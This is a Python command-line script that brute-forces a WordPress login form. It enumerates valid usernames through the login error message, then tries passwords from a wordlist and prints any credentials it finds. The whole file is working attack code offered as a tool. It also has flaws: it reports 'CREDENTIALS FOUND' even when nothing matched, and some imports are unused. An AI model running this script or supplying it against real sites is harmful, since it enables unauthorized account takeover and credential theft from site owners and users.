#!/usr/bin/env python3

"""WordPress Attack

Try to bruteforce a wordpress login form

Usage: $ python3 wordpress.py [-h] -s SITE -u USERNAMES -p PASSWORDS
"""

import argparse
import sys
import threading

import bs4
import requests


def argparser():
    """Parses required arguments

    Returns:
        argparse object: Variables to hold host URL, username list, and password list
    """
    parser = argparse.ArgumentParser(description="Wordpress Login Form Hack")
    parser.add_argument(
        "-s", "--site", help="full URL for wordpress login form page", required=True
    )
    parser.add_argument(
        "-u",
        "--usernames",
        type=argparse.FileType("r"),
        help="list of usernames",
        required=True,
    )
    parser.add_argument(
        "-p",
        "--passwords",
        type=argparse.FileType("r"),
        help="list of passwords",
        required=True,
    )
    args = parser.parse_args()
    return args


def check_status(target: str) -> int:
    """Checks status of a web page

    Args:
        target (str): URL for web form

    Returns:
        int: Status code
    """
    try:
        r = requests.get(target)
        print(f"Status for <{target}>: {r.status_code}")
        return r.status_code
    except Exception as e:
        print(f"Exception: {e}")
        return None


def wp_brute_force_login(
    target: str, ufile: argparse.FileType, pfile: argparse.FileType
) -> str:
    """Attempts to bruteforce a WordPress CMS login

    Args:
        target (str): URL for a WordPress CMS login

    Returns:
        list: password on success else none
    """
    print(
        f"Hacking {target}\n\t- username list: {ufile.name}\n\t- password list: {pfile.name}"
    )
    if check_status(target) != 200:
        print("Page does not exist, stopping...")
        return None
    input("Page exists, press [Enter] to continue...")
    username = None
    password = None
    usernames = [line.strip() for line in ufile.readlines()]
    passwords = [line.rstrip("\n") for line in pfile.readlines()]
    for user in usernames:
        print(f"Attempting username {user}...", end="")
        attempt = requests.post(target, data={"log": user, "pwd": "-1"})
        if "incorrect" in attempt.text:
            print("SUCCESS")
            username = user
            break
        else:
            print("FAIL")
    ans = input(f'User "{username}" found, try finding password [y/n]? ')
    if ans == "y":
        for pwd in passwords:
            print(f"Attempting password {pwd}... ", end="")
            attempt = requests.post(target, data={"log": username, "pwd": pwd})
            if "incorrect" not in attempt.text:
                print("SUCCESS")
                password = pwd
                break
            else:
                print("FAIL")
    print(f"CREDENTIALS FOUND\n\tUsername: {username}\n\tPassword: {password}")


if __name__ == "__main__":
    args = argparser()
    wp_brute_force_login(args.site, args.usernames, args.passwords)
